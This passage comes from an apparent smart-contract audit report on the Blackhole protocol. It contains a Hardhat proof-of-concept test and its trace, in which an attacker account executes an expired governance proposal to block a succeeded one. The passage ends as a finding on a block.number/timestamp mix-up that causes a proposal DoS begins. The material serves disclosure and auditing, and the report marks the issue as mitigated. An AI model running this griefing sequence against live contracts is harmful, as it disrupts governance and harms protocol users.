class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Advancing time for PROP_EXPIRED to expire...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let deadlineExpired = await blackGovernor.proposalDeadline(proposalId_Expired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let currentTime = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (deadlineExpired.gt(currentTime)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await advanceTime(deadlineExpired.sub(currentTime).toNumber() + 60); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await blackGovernor.state(proposalId_Expired)).to.equal(6); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;PROP_EXPIRED is Expired.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Voting for PROP_SUCCEED...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let snapshotSucceed = await blackGovernor.proposalSnapshot(proposalId_Succeed);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        currentTime = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (snapshotSucceed.gt(currentTime)) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await advanceTime(snapshotSucceed.sub(currentTime).toNumber() + 60); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(smVoter1EOA).castVote(proposalId_Succeed, 1); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(smVoter2EOA).castVote(proposalId_Succeed, 1); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Votes cast for PROP_SUCCEED.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let deadlineSucceed = await blackGovernor.proposalDeadline(proposalId_Succeed);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        currentTime = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (deadlineSucceed.gt(currentTime)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await advanceTime(deadlineSucceed.sub(currentTime).toNumber() + 60); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await blackGovernor.state(proposalId_Succeed)).to.equal(4); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;PROP_SUCCEED is Succeeded.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Advancing Minter to a new active period for nudge...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let minterActivePeriodForNudge = await minterUpgradeable.active_period();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const currentBlockTimeForUpkeep = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (currentBlockTimeForUpkeep \u0026lt; minterActivePeriodForNudge.add(CONTRACT_WEEK)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await advanceTime(minterActivePeriodForNudge.add(CONTRACT_WEEK).sub(currentBlockTimeForUpkeep).toNumber() + 60);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minterUpgradeable.connect(deployer).update_period(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let targetEmissionPeriod = await minterUpgradeable.active_period(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await minterUpgradeable.proposals(targetEmissionPeriod)).to.be.false;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const initialTailRate = await minterUpgradeable.tailEmissionRate(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`Attacker executing Expired Proposal ID: ${proposalId_Expired.toString()} for Minter period ${targetEmissionPeriod.toString()}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(attackerEOA).execute(targets, values, calldatas, epochTimeHash_Expired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await minterUpgradeable.proposals(targetEmissionPeriod)).to.be.true;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await minterUpgradeable.tailEmissionRate()).to.equal(initialTailRate); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Expired proposal executed by attacker, nudge flag set for period. Tail rate unchanged.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`Attempting to execute Succeeded Proposal ID: ${proposalId_Succeed.toString()} for Minter period ${targetEmissionPeriod.toString()}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await expect(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            blackGovernor.connect(deployer).execute(targets, values, calldatas, epochTimeHash_Succeed)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ).to.be.revertedWith(\u0026quot;Governor: call reverted without message\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Succeeded proposal blocked by attacker\u0026#39;s action as expected.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await minterUpgradeable.tailEmissionRate()).to.equal(initialTailRate); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003e\u003cstrong\u003eExpected trace:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"64\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003enpx hardhat test test/GovernorExecuteGrief.test.js\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBlackGovernor - Griefing Attack via Flawed L2Governor.execute()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eStarting beforeEach: Deploying ALL REAL in-scope contracts...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Libraries deployed (VBL, VFL).\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Black token deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Black token initialMint called by deployer.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  PermissionsRegistry deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  GAUGE_ADMIN role granted to deployer.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  GOVERNANCE role granted to deployer.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  TokenHandler deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  VotingEscrow deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  RewardsDistributor deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  PairFactory (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  AlgebraPoolAPIStorage (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Gauge Factories deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eWarning: Potentially unsafe deployment of contracts/GaugeManager.sol:GaugeManager\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    You are using the `unsafeAllow.external-library-linking` flag to include external libraries.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    Make sure you have manually checked that the linked libraries are upgrade safe.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  GaugeManager (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  VoterV3 (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  BribeFactoryV3 (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  MinterUpgradeable (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Black token minter changed to MinterUpgradeable.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  BlackGovernor deployed and proposalNumerator set to 0.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePreparing proposer and voters...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Proposer smNFT lock created.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  smVoter1 smNFT created.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  smVoter2 smNFT created.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  End of beforeEach: Proposer smNFT Votes (current ts): 2200.0 BLACK\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  End of beforeEach: VE TotalSupply (current ts): 3300.0 BLACK\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  End of beforeEach: BlackGovernor Threshold (current ts, numerator 0): 0.0 BLACK\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAdvancing Minter to Tail Emission phase...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  MinterUpgradeable._initialize() called or already handled.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Initial Minter weekly for tail phase: 10000000.0, TAIL_START: 8969150.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Minter internal epochCount before loop: 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMinter in Tail Emission. Minter epochCount: 66, Weekly: 8969149.540107574558747588\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ebeforeEach setup complete.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eProposing PROP_EXPIRED...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Proposer EOA: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Block number for PROP_EXPIRED getVotes snapshot: 185\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Proposer\u0026#39;s votes for PROP_EXPIRED (using block num as ts): 0.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Proposal Threshold for PROP_EXPIRED (using current ts): 0.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eProposing PROP_SUCCEED...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  epochTimeHash_Expired: 0x000000000000000000000000000000000000000000000000000000006839eb18\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  epochTimeHash_Succeed: 0x000000000000000000000000000000000000000000000000000000006839ee9c\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAdvancing time for PROP_EXPIRED to expire...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROP_EXPIRED is Expired.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVoting for PROP_SUCCEED...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVotes cast for PROP_SUCCEED.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROP_SUCCEED is Succeeded.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAdvancing Minter to a new active period for nudge...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAttacker executing Expired Proposal ID: 95663595387384231139373561555078924596465919427795029072961122541929471258304 for Minter period 1748628000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eExpired proposal executed by attacker, nudge flag set for period. Tail rate unchanged.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAttempting to execute Succeeded Proposal ID: 28181572287723674322142969551870591870160588535690567740327278394187501343944 for Minter period 1748628000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSucceeded proposal blocked by attacker\u0026#39;s action as expected.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ✔ should allow attacker to execute an Expired proposal to grief Minter.nudge() and block a Succeeded proposal (141ms)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1 passing (3s)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-48\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-16-getvotes-inside-the-blackgovernor-incorrectly-provides-blocknumber-instead-of-blocktimestamp-leading-to-complete-dos-of-proposal-functionality\" style=\"position:relative;\"\u003e\u003ca href=\"#m-16-getvotes-inside-the-blackgovernor-incorrectly-provides-blocknumber-instead-of-blocktimestamp-leading-to-complete-dos-of-proposal-functionality\" aria-label=\"m 16 getvotes inside the blackgovernor incorrectly provides blocknumber instead of blocktimestamp leading to complete dos of proposal functionality permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-163\"\u003e[M-16] \u003ccode\u003egetVotes\u003c/code\u003e inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e incorrectly provides \u003ccode\u003eblock.number\u003c/code\u003e instead of \u003ccode\u003eblock.timestamp\u003c/code\u003e, leading to complete DOS of proposal functionality\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-406\"\u003ehakunamatata\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-71\"\u003eEgbe\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/BlackGovernor.sol#L95-L107\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/BlackGovernor.sol#L95-L107\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L268-L271\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L268-L271\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L414-L416\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L414-L416\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L746-L753\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L746-L753\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-4\" aria-label=\"finding description and impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eWhenever user is making a proposal inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e, the contract checks whether their voting power meets the proposal threshold. However, this check is copied from the \u003ccode\u003eThenaFi\u003c/code\u003e contracts which is incorrect. I disclosed the vulnerability to the \u003ccode\u003eThenaFI\u003c/code\u003e team, however, the bug is not present in the live contracts as \u003ccode\u003eThenaFI\u003c/code\u003e team has informed me.\u003c/p\u003e\n\u003cp\u003eThe check is incorrect as it passes the \u003ccode\u003e(block.number - 1)\u003c/code\u003e to the \u003ccode\u003egetVotes\u003c/code\u003e function that expects timestamp:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_proposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 